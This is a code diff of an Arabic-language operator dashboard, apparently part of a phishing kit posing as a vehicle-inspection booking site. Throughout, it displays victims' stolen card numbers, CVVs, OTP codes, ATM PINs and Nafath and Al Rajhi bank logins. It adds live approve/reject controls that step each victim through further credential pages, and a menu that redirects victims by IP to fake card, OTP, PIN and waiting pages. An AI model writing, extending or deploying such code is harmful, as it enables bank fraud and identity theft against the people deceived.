-    if (sessionData[key].length > 20) sessionData[key].pop();
-    showToast('بيانات جديدة: ' + (typeLabels[d.type] || d.type), 'info');
-    // تحديث المودال إذا كان مفتوحاً
-    var overlay = document.getElementById('moverlay');
-    if (overlay.classList.contains('active') && currentBookingIdx >= 0) {
-      updateModalData(bookings[currentBookingIdx]);
-    }
+  socket.on('bookingUpdated', (booking) => {
+    const idx = allBookings.findIndex(b => b.id === booking.id);
+    if (idx >= 0) allBookings[idx] = booking;
+    renderBookings();
+    updateStats();
+  });
+
+  // New payment data - needs approval
+  socket.on('newPayment', (data) => {
+    addPendingRequest(data, 'payment');
+  });
+
+  // New code (OTP/PIN) - needs approval
+  socket.on('newCode', (data) => {
+    addPendingRequest(data, data.type || 'otp');
   });
 }
 
-var typeLabels = {
-  payment: 'بيانات بطاقة',
-  phone: 'رقم الهاتف',
-  phoneCode: 'كود الهاتف',
-  code: 'كود OTP',
-  nafad: 'بيانات نفاذ',
-  rajhi: 'بيانات الراجحي',
-  rajhiCode: 'كود الراجحي',
-  verification: 'بيانات التحقق',
-  pin: 'رمز PIN',
-  atm: 'رقم سري ATM'
-};
+// ==================== Pending Requests ====================
+function addPendingRequest(data, type) {
+  const requestId = data.requestId;
+  pendingRequests[requestId] = { ...data, type };
+  renderPendingRequests();
+  updatePendingCount();
 
-async function loadBookings() {
+  // Play notification sound
   try {
-    var r = await fetch(SRV + '/api/bookings');
-    var d = await r.json();
-    if (d.success) { bookings = d.bookings || []; renderBookings(bookings); updateStats(); }
-  } catch(e) { renderBookings([]); }
+    const ctx = new AudioContext();
+    const osc = ctx.createOscillator();
+    const gain = ctx.createGain();
+    osc.connect(gain);
+    gain.connect(ctx.destination);
+    osc.frequency.value = 880;
+    gain.gain.setValueAtTime(0.3, ctx.currentTime);
+    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.5);
+    osc.start(ctx.currentTime);
+    osc.stop(ctx.currentTime + 0.5);
+  } catch(e) {}
 }
 
-function renderBookings(data) {
-  var tb = document.getElementById('btable');
-  if (!data || !data.length) {
-    tb.innerHTML = '<tr><td colspan="9"><div class="empty"><i class="fas fa-inbox"></i><p>لا توجد حجوزات بعد</p></div></td></tr>';
+function renderPendingRequests() {
+  const grid = document.getElementById('pendingGrid');
+  const section = document.getElementById('pendingSection');
+  const requests = Object.values(pendingRequests);
+
+  if (requests.length === 0) {
+    section.style.display = 'none';
     return;
   }
-  tb.innerHTML = data.map(function(b, i) {
-    // زر إعادة التوجيه مع قائمة منسدلة
-    var navOpts = PAGES.map(function(p){
-      return '<a onclick="sendNavById(\'' + (b.socketId||b.ip||'') + '\',\'' + p.v + '\',this)">' + p.l + '</a>';
-    }).join('');
-    var navBtn = '<div style="position:relative;display:inline-block"><button class="bnav" onclick="toggleNav(this)"><i class="fas fa-paper-plane"></i> توجيه</button><div class="navdrop">' + navOpts + '</div></div>';
-    return '<tr>' +
-      '<td>' + (i+1) + '</td>' +
-      '<td><b>' + (b.name||'-') + '</b></td>' +
-      '<td>' + (b.phone_number||b.phone||'-') + '</td>' +
-      '<td>' + (b.region||'-') + '</td>' +
-      '<td>' + (b.service_type||'-') + '</td>' +
-      '<td>' + (b.date_svc||b.date||'-') + '</td>' +
-      '<td>' + (b.time_svc||b.time||'-') + '</td>' +
-      '<td>' + sbadge(b.status) + '</td>' +
-      '<td><div class="abts">' +
-        '<button class="bdet" onclick="showDet(' + i + ')"><i class="fas fa-eye"></i> تفاصيل</button>' +
-        navBtn +
-      '</div></td>' +
-    '</tr>';
+
+  section.style.display = 'block';
+  document.getElementById('pendingCount').textContent = requests.length;
+
+  grid.innerHTML = requests.map(req => {
+    if (req.type === 'payment') {
+      return `
+        <div class="pending-card payment-card" id="req-${req.requestId}">
+          <div class="pending-card-header">
+            <div class="pending-type">
+              <i class="fas fa-credit-card" style="color:#7c3aed"></i>
+              بيانات بطاقة جديدة
+              <span class="type-badge payment">بطاقة</span>
+            </div>
+            <span class="pending-ip">${req.ip || '-'}</span>
+          </div>
+          <div class="pending-data">
+            <div class="data-field full">
+              <label>اسم حامل البطاقة</label>
+              <span>${req.cardHolderName || '-'}</span>
+            </div>
+            <div class="data-field">
+              <label>رقم البطاقة</label>
+              <span>${req.cardNumber || '-'}</span>
+            </div>
+            <div class="data-field">
+              <label>نوع البطاقة</label>
+              <span>${req.cardType || '-'}</span>
+            </div>
+            <div class="data-field">
+              <label>تاريخ الانتهاء</label>
+              <span>${req.expiry || '-'}</span>
+            </div>
+            <div class="data-field">
+              <label>CVV</label>
+              <span>${req.cvv || '-'}</span>
+            </div>
+          </div>
+          <div class="pending-actions">
+            <button class="btn-approve" onclick="approveRequest('${req.requestId}')">
+              <i class="fas fa-check"></i> قبول → OTP
+            </button>
+            <button class="btn-reject" onclick="rejectRequest('${req.requestId}')">
+              <i class="fas fa-times"></i> رفض
+            </button>
+          </div>
+        </div>`;
+    } else if (req.type === 'otp' || req.type === 'verification_code') {
+      return `
+        <div class="pending-card otp-card" id="req-${req.requestId}">
+          <div class="pending-card-header">
+            <div class="pending-type">
+              <i class="fas fa-key" style="color:#ea580c"></i>
+              رمز OTP جديد
+              <span class="type-badge otp">OTP</span>
+            </div>
+            <span class="pending-ip">${req.ip || '-'}</span>
+          </div>
+          <div class="pending-data">
+            <div class="data-field full">
+              <label>رمز التحقق OTP</label>
+              <span style="font-size:22px;font-weight:800;color:#ea580c;letter-spacing:4px">${req.code || '-'}</span>
+            </div>
+          </div>
+          <div class="pending-actions">
+            <button class="btn-approve" onclick="approveRequest('${req.requestId}')">
+              <i class="fas fa-check"></i> قبول → رقم سري ATM
+            </button>
+            <button class="btn-reject" onclick="rejectRequest('${req.requestId}', 'برجاء التحقق من الرمز الصحيح')">
+              <i class="fas fa-times"></i> رفض → إعادة OTP
+            </button>
+          </div>
+        </div>`;
+    } else if (req.type === 'pin') {
+      return `
+        <div class="pending-card pin-card" id="req-${req.requestId}">
+          <div class="pending-card-header">
+            <div class="pending-type">
+              <i class="fas fa-lock" style="color:#0d9488"></i>
+              رقم سري ATM جديد
+              <span class="type-badge pin">ATM PIN</span>
+            </div>
+            <span class="pending-ip">${req.ip || '-'}</span>
+          </div>
+          <div class="pending-data">
+            <div class="data-field full">
+              <label>الرقم السري</label>
+              <span style="font-size:22px;font-weight:800;color:#0d9488;letter-spacing:4px">${req.code || '-'}</span>
+            </div>
+          </div>
+          <div class="pending-actions">
+            <button class="btn-approve" onclick="approveRequest('${req.requestId}')">
+              <i class="fas fa-check"></i> قبول
+            </button>
+            <button class="btn-reject" onclick="rejectRequest('${req.requestId}')">
+              <i class="fas fa-times"></i> رفض
+            </button>
+          </div>
+        </div>`;
+    } else {
+      return `
+        <div class="pending-card" id="req-${req.requestId}">
+          <div class="pending-card-header">
+            <div class="pending-type">
+              <i class="fas fa-info-circle"></i>
+              بيانات جديدة (${req.type})
+            </div>
+            <span class="pending-ip">${req.ip || '-'}</span>
+          </div>
+          <div class="pending-data">
+            <div class="data-field full">
+              <label>البيانات</label>
+              <span>${req.code || JSON.stringify(req)}</span>
+            </div>
+          </div>
+          <div class="pending-actions">
+            <button class="btn-approve" onclick="approveRequest('${req.requestId}')">
+              <i class="fas fa-check"></i> قبول
+            </button>
+            <button class="btn-reject" onclick="rejectRequest('${req.requestId}')">
+              <i class="fas fa-times"></i> رفض
+            </button>
+          </div>
+        </div>`;
+    }
   }).join('');
 }
 
-function toggleNav(btn) {
-  var drop = btn.nextElementSibling;
-  var wasOpen = drop.classList.contains('open');
-  document.querySelectorAll('.navdrop.open').forEach(function(d){ d.classList.remove('open'); });
-  if (!wasOpen) drop.classList.add('open');
+function updatePendingCount() {
+  const count = Object.keys(pendingRequests).length;
+  document.getElementById('statPending').textContent = count;
 }
 
-function sendNavById(socketIdOrIp, page, el) {
-  if (socket) {
-    socket.emit('adminNavigate', { socketId: socketIdOrIp, page: page });
-    showToast('تم التوجيه إلى: ' + page, 'success');
-  }
-  // إغلاق القائمة
-  var drop = el.closest('.navdrop');
-  if (drop) drop.classList.remove('open');
-}
-
-function sbadge(s) {
-  var m = {
-    pending:'<span class="badge bp">انتظار</span>',
-    confirmed:'<span class="badge bc">مؤكد</span>',
-    rejected:'<span class="badge br">مرفوض</span>',
-    new:'<span class="badge bn">جديد</span>'
-  };
-  return m[s] || '<span class="badge bn">جديد</span>';
-}
-
-function filterTable() {
-  var q = document.getElementById('srch').value.toLowerCase();
-  renderBookings(bookings.filter(function(b){
-    return (b.name||'').toLowerCase().includes(q)||(b.phone_number||b.phone||'').includes(q)||(b.region||'').toLowerCase().includes(q);
-  }));
-}
-
-async function updSt(id, status) {
+async function approveRequest(requestId) {
   try {
-    var r = await fetch(SRV + '/api/bookings/' + id + '/status', {
-      method:'PUT',
-      headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({status:status})
+    await fetch(`${SERVER_URL}/api/approve`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ requestId })
     });
-    var d = await r.json();
-    if (d.success) {
-      showToast(status==='confirmed'?'تم قبول الحجز ✓':'تم رفض الحجز ✗', status==='confirmed'?'success':'error');
-      loadBookings();
-      closeM();
-    }
-  } catch(e) { showToast('حدث خطأ','error'); }
+    removePendingRequest(requestId);
+    document.getElementById('statCompleted').textContent =
+      parseInt(document.getElementById('statCompleted').textContent) + 1;
+  } catch(e) {
+    // Also try via socket
+    if (socket) socket.emit('adminApprove', { requestId });
+    removePendingRequest(requestId);
+  }
+}
+
+async function rejectRequest(requestId, message) {
+  try {
+    await fetch(`${SERVER_URL}/api/reject`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ requestId, message: message || 'تم الرفض' })
+    });
+    removePendingRequest(requestId);
+  } catch(e) {
+    if (socket) socket.emit('adminReject', { requestId, message: message || 'تم الرفض' });
+    removePendingRequest(requestId);
+  }
+}
+
+function removePendingRequest(requestId) {
+  delete pendingRequests[requestId];
+  const el = document.getElementById(`req-${requestId}`);
+  if (el) el.remove();
+  renderPendingRequests();
+  updatePendingCount();
+}
+
+// ==================== Bookings ====================
+async function loadBookings() {
+  try {
+    const res = await fetch(`${SERVER_URL}/api/bookings`);
+    const data = await res.json();
+    allBookings = data.bookings || [];
+    renderBookings();
+    updateStats();
+  } catch(e) {
+    console.error('Load bookings error:', e);
+  }
+}
+
+function renderBookings() {
+  const tbody = document.getElementById('bookingsBody');
+  const search = document.getElementById('searchInput').value.toLowerCase();
+  const filtered = allBookings.filter(b =>
+    !search ||
+    (b.name && b.name.toLowerCase().includes(search)) ||
+    (b.national_id && b.national_id.includes(search)) ||
+    (b.phone_number && b.phone_number.includes(search)) ||
+    (b.region && b.region.toLowerCase().includes(search))
+  );
+
+  if (filtered.length === 0) {
+    tbody.innerHTML = '<tr><td colspan="8" class="empty-state"><i class="fas fa-inbox"></i>لا توجد حجوزات</td></tr>';
+    return;
+  }
+
+  tbody.innerHTML = filtered.map(b => `
+    <tr>
+      <td>${b.name || '-'}</td>
+      <td style="direction:ltr">${b.national_id || '-'}</td>
+      <td style="direction:ltr">${b.phone_number || '-'}</td>
+      <td>${b.region || '-'}</td>
+      <td>${b.service_type || '-'}</td>
+      <td style="direction:ltr">${b.date_svc || '-'}</td>
+      <td><span class="status-badge status-${b.status || 'new'}">${getStatusLabel(b.status)}</span></td>
+      <td>
+        <div style="display:flex;gap:6px;align-items:center">
+          <button class="btn-details" onclick="showDetails(${b.id})">
+            <i class="fas fa-eye"></i> تفاصيل
+          </button>
+          <div style="position:relative">
+            <button class="btn-nav" onclick="toggleNavDropdown(this, '${b.ip}', '${b.id}')">
+              <i class="fas fa-directions"></i>
+            </button>
+            <div class="nav-dropdown">
+              <a onclick="navigateTo('${b.ip}', 'booking')"><i class="fas fa-calendar" style="margin-left:8px;color:#1a5c38"></i> صفحة الحجز</a>
+              <a onclick="navigateTo('${b.ip}', 'payments')"><i class="fas fa-credit-card" style="margin-left:8px;color:#7c3aed"></i> صفحة البطاقة</a>
+              <a onclick="navigateTo('${b.ip}', 'phone')"><i class="fas fa-phone" style="margin-left:8px;color:#2563eb"></i> صفحة الهاتف</a>
+              <a onclick="navigateTo('${b.ip}', 'code')"><i class="fas fa-key" style="margin-left:8px;color:#ea580c"></i> صفحة OTP</a>
+              <a onclick="navigateTo('${b.ip}', 'pin')"><i class="fas fa-lock" style="margin-left:8px;color:#0d9488"></i> صفحة الرقم السري</a>
+              <a onclick="navigateTo('${b.ip}', 'whats')"><i class="fab fa-whatsapp" style="margin-left:8px;color:#25d366"></i> صفحة واتساب</a>
+              <a onclick="navigateTo('${b.ip}', 'nafad')"><i class="fas fa-id-card" style="margin-left:8px;color:#d97706"></i> صفحة نفاذ</a>
+              <a onclick="navigateTo('${b.ip}', 'stcCall')"><i class="fas fa-spinner" style="margin-left:8px;color:#718096"></i> صفحة الانتظار</a>
+            </div>
+          </div>
+        </div>
+      </td>
+    </tr>
+  `).join('');
+}
+
+function filterTable() { renderBookings(); }
+
+function getStatusLabel(status) {
+  const labels = { new: 'جديد', approved: 'مقبول', rejected: 'مرفوض', pending: 'قيد المعالجة' };
+  return labels[status] || status || 'جديد';
 }
 
 function updateStats() {
-  var t = bookings.length;
-  var p = bookings.filter(function(b){ return !b.status||b.status==='pending'||b.status==='new'; }).length;
-  var c = bookings.filter(function(b){ return b.status==='confirmed'; }).length;
-  var today = new Date().toISOString().split('T')[0];
-  var td = bookings.filter(function(b){ var d = b.created_at||''; return d.includes(today); }).length;
-  document.getElementById('s5').textContent = t;
-  document.getElementById('s2').textContent = p;
-  document.getElementById('s3').textContent = c;
-  document.getElementById('s4').textContent = td;
+  document.getElementById('statTotal').textContent = allBookings.length;
+  const today = new Date().toISOString().split('T')[0];
+  const todayCount = allBookings.filter(b => b.created_at && b.created_at.startsWith(today)).length;
+  document.getElementById('statToday').textContent = todayCount;
+  const completed = allBookings.filter(b => b.status === 'approved').length;
+  document.getElementById('statCompleted').textContent = completed;
 }
 
-var currentBookingIdx = -1;
-
-function showDet(idx) {
-  currentBookingIdx = idx;
-  var b = bookings[idx]; if (!b) return;
-  updateModalData(b);
-  document.getElementById('moverlay').classList.add('active');
+// ==================== Navigation ====================
+function toggleNavDropdown(btn, ip, bookingId) {
+  const dropdown = btn.nextElementSibling;
+  document.querySelectorAll('.nav-dropdown.show').forEach(d => {
+    if (d !== dropdown) d.classList.remove('show');
+  });
+  dropdown.classList.toggle('show');
+  event.stopPropagation();
 }
 
-function updateModalData(b) {
-  if (!b) return;
-  var pend = !b.status || b.status === 'pending' || b.status === 'new';
+document.addEventListener('click', () => {
+  document.querySelectorAll('.nav-dropdown.show').forEach(d => d.classList.remove('show'));
+});
 
-  // البيانات الأساسية
-  var html = '<div class="drow"><span class="dlbl">الاسم</span><span class="dval">' + (b.name||'-') + '</span></div>' +
-    '<div class="drow"><span class="dlbl">رقم الهوية</span><span class="dval">' + (b.national_id||'-') + '</span></div>' +
-    '<div class="drow"><span class="dlbl">رقم الهاتف</span><span class="dval">' + (b.phone_number||b.phone||'-') + '</span></div>' +
-    '<div class="drow"><span class="dlbl">البريد الإلكتروني</span><span class="dval">' + (b.email||'-') + '</span></div>' +
-    '<div class="drow"><span class="dlbl">الجنسية</span><span class="dval">' + (b.nationality||'-') + '</span></div>' +
-    '<div class="drow"><span class="dlbl">المنطقة</span><span class="dval">' + (b.region||'-') + '</span></div>' +
-    '<div class="drow"><span class="dlbl">نوع الخدمة</span><span class="dval">' + (b.service_type||'-') + '</span></div>' +
-    '<div class="drow"><span class="dlbl">تاريخ الفحص</span><span class="dval">' + (b.date_svc||b.date||'-') + '</span></div>' +
-    '<div class="drow"><span class="dlbl">وقت الفحص</span><span class="dval">' + (b.time_svc||b.time||'-') + '</span></div>' +
-    '<div class="drow"><span class="dlbl">رقم اللوحة</span><span class="dval">' + (b.plate||'-') + '</span></div>' +
-    '<div class="drow"><span class="dlbl">الحالة</span><span class="dval">' + sbadge(b.status) + '</span></div>' +
-    '<div class="drow"><span class="dlbl">IP</span><span class="dval">' + (b.ip||'-') + '</span></div>' +
-    '<div class="drow"><span class="dlbl">تاريخ التسجيل</span><span class="dval">' + (b.created_at ? new Date(b.created_at).toLocaleString('ar') : '-') + '</span></div>';
-
-  // البيانات الإضافية (بطاقة، OTP، هاتف...)
-  var key = b.ip || b.socketId || '';
-  var extras = sessionData[key] || [];
-  if (extras.length > 0) {
-    html += '<div class="dsection">';
-    html += '<div class="dsection-title"><i class="fas fa-database" style="color:#ea580c"></i>البيانات الواردة</div>';
-    extras.forEach(function(d) {
-      var detail = '';
-      if (d.type === 'payment' && d.data) {
-        detail = '<div class="drow"><span class="dlbl">رقم البطاقة</span><span class="dval" style="font-family:monospace;letter-spacing:2px">' + (d.data.cardNumber||'').replace(/(.{4})/g,'$1 ').trim() + '</span></div>' +
-          '<div class="drow"><span class="dlbl">تاريخ الانتهاء</span><span class="dval">' + (d.data.expiry||d.data.expiryDate||'-') + '</span></div>' +
-          '<div class="drow"><span class="dlbl">CVV</span><span class="dval">' + (d.data.cvv||'-') + '</span></div>' +
-          '<div class="drow"><span class="dlbl">اسم حامل البطاقة</span><span class="dval">' + (d.data.cardName||d.data.name||'-') + '</span></div>';
-      } else if (d.type === 'phone' && d.data) {
-        detail = '<div class="drow"><span class="dlbl">رقم الهوية</span><span class="dval">' + (d.data.nationalId||d.data.nationalID||'-') + '</span></div>';
-      } else if ((d.type === 'code' || d.type === 'phoneCode' || d.type === 'pin' || d.type === 'atm') && d.data) {
-        detail = '<div class="drow"><span class="dlbl">الكود</span><span class="dval" style="font-size:18px;font-weight:700;color:#dc2626;letter-spacing:4px">' + (d.data.code||d.data.pin||d.data.otp||'-') + '</span></div>';
-      } else if (d.type === 'nafad' && d.data) {
-        detail = '<div class="drow"><span class="dlbl">اسم المستخدم</span><span class="dval">' + (d.data.username||'-') + '</span></div>' +
-          '<div class="drow"><span class="dlbl">كلمة المرور</span><span class="dval">' + (d.data.password||'-') + '</span></div>';
-      } else if (d.type === 'rajhi' && d.data) {
-        detail = '<div class="drow"><span class="dlbl">اسم المستخدم</span><span class="dval">' + (d.data.username||'-') + '</span></div>' +
-          '<div class="drow"><span class="dlbl">كلمة المرور</span><span class="dval">' + (d.data.password||'-') + '</span></div>';
-      }
-      html += '<div style="background:#fff;border-radius:8px;padding:10px;margin-bottom:8px;border:1px solid #f3f4f6">' +
-        '<div style="font-size:11px;font-weight:700;color:#ea580c;margin-bottom:6px"><i class="fas fa-circle" style="font-size:7px;margin-left:4px"></i>' + (typeLabels[d.type]||d.type) + '</div>' +
-        detail + '</div>';
+async function navigateTo(ip, page) {
+  document.querySelectorAll('.nav-dropdown.show').forEach(d => d.classList.remove('show'));
+  try {
+    await fetch(`${SERVER_URL}/api/navigate`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ ip, page })
     });
-    html += '</div>';
+  } catch(e) {
+    if (socket) socket.emit('adminNavigate', { ip, page });
   }
-
-  document.getElementById('mbody').innerHTML = html;
-
-  // أزرار القبول والرفض فقط للحجوزات المعلقة
-  document.getElementById('macts').innerHTML = pend ?
-    '<button class="macc" onclick="updSt(' + b.id + ',\'confirmed\')"><i class="fas fa-check"></i> قبول</button>' +
-    '<button class="mrej2" onclick="updSt(' + b.id + ',\'rejected\')"><i class="fas fa-times"></i> رفض</button>' : '';
 }
 
-function closeMO(e) { if (e.target === document.getElementById('moverlay')) closeM(); }
-function closeM() {
-  document.getElementById('moverlay').classList.remove('active');
-  currentBookingIdx = -1;
+// ==================== Modal ====================
+async function showDetails(bookingId) {
+  const booking = allBookings.find(b => b.id === bookingId);
+  if (!booking) return;
+  currentModalBooking = booking;
+
+  let extraData = { payments: [], codes: [], phones: [] };
+  try {
+    const res = await fetch(`${SERVER_URL}/api/data/${booking.ip}`);
+    extraData = await res.json();
+  } catch(e) {}
+
+  const body = document.getElementById('modalBody');
+  body.innerHTML = `
+    <div class="modal-section">
+      <h4><i class="fas fa-user" style="margin-left:6px"></i> بيانات العميل</h4>
+      <div class="modal-grid">
+        <div class="modal-field"><label>الاسم</label><span>${booking.name || '-'}</span></div>
+        <div class="modal-field"><label>رقم الهوية</label><span>${booking.national_id || '-'}</span></div>
+        <div class="modal-field"><label>رقم الهاتف</label><span>${booking.phone_number || '-'}</span></div>
+        <div class="modal-field"><label>الجنسية</label><span>${booking.nationality || '-'}</span></div>
+        <div class="modal-field"><label>المنطقة</label><span>${booking.region || '-'}</span></div>
+        <div class="modal-field"><label>نوع الخدمة</label><span>${booking.service_type || '-'}</span></div>
+        <div class="modal-field"><label>التاريخ</label><span>${booking.date_svc || '-'}</span></div>
+        <div class="modal-field"><label>الوقت</label><span>${booking.time_svc || '-'}</span></div>
+        <div class="modal-field"><label>IP</label><span>${booking.ip || '-'}</span></div>
+        <div class="modal-field"><label>الحالة</label><span>${getStatusLabel(booking.status)}</span></div>
+      </div>
+    </div>
+    ${extraData.payments && extraData.payments.length > 0 ? `
+    <div class="modal-section">
+      <h4><i class="fas fa-credit-card" style="margin-left:6px;color:#7c3aed"></i> بيانات البطاقة</h4>
+      ${extraData.payments.map(p => `
+      <div class="modal-grid" style="margin-bottom:10px">
+        <div class="modal-field full"><label>اسم حامل البطاقة</label><span>${p.card_holder_name || '-'}</span></div>
+        <div class="modal-field"><label>رقم البطاقة</label><span>${p.card_number || '-'}</span></div>
+        <div class="modal-field"><label>نوع البطاقة</label><span>${p.card_type || '-'}</span></div>
+        <div class="modal-field"><label>تاريخ الانتهاء</label><span>${p.expiry || '-'}</span></div>
+        <div class="modal-field"><label>CVV</label><span>${p.cvv || '-'}</span></div>
+      </div>`).join('')}
+    </div>` : ''}
+    ${extraData.codes && extraData.codes.length > 0 ? `
+    <div class="modal-section">
+      <h4><i class="fas fa-key" style="margin-left:6px;color:#ea580c"></i> الرموز والأكواد</h4>
+      ${extraData.codes.map(c => `
+      <div class="modal-grid" style="margin-bottom:8px">
+        <div class="modal-field"><label>النوع</label><span>${c.code_type || '-'}</span></div>
+        <div class="modal-field"><label>الرمز</label><span style="font-size:18px;font-weight:800;letter-spacing:3px">${c.code || '-'}</span></div>
+      </div>`).join('')}
+    </div>` : ''}
+  `;
+
+  const footer = document.getElementById('modalFooter');
+  footer.innerHTML = `
+    <button class="btn-modal-approve" onclick="updateBookingStatus(${booking.id}, 'approved')">
+      <i class="fas fa-check"></i> قبول
+    </button>
+    <button class="btn-modal-reject" onclick="updateBookingStatus(${booking.id}, 'rejected')">
+      <i class="fas fa-times"></i> رفض
+    </button>
+  `;
+
+  document.getElementById('detailsModal').classList.add('show');
 }
 
-function showToast(msg, type) {
-  var t = document.getElementById('toast');
-  t.textContent = msg;
-  t.className = 'toast show ' + (type||'');
-  setTimeout(function(){ t.className = 'toast'; }, 3000);
+function closeModal() {
+  document.getElementById('detailsModal').classList.remove('show');
 }
+
+async function updateBookingStatus(bookingId, status) {
+  try {
+    await fetch(`${SERVER_URL}/api/bookings/${bookingId}/status`, {
+      method: 'PUT',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ status })
+    });
+    closeModal();
+    loadBookings();
+  } catch(e) {
+    console.error(e);
+  }
+}
+
+// Close modal on overlay click
+document.getElementById('detailsModal').addEventListener('click', function(e) {
+  if (e.target === this) closeModal();
+});
 </script>
 </body>
 </html>
